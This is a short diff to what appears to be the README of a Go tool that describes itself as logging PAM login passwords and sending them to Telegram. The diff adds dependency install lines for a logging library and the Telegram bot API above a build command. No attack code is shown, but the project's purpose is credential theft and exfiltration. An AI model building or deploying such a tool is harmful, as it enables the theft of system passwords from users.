@@ -2,6 +2,8 @@
 log pam password and send in telegram
 ###
 ```
+go get -u github.com/rs/zerolog/log
+go get github.com/go-telegram-bot-api/telegram-bot-api/v5
 go build main.go
 ```
 ###
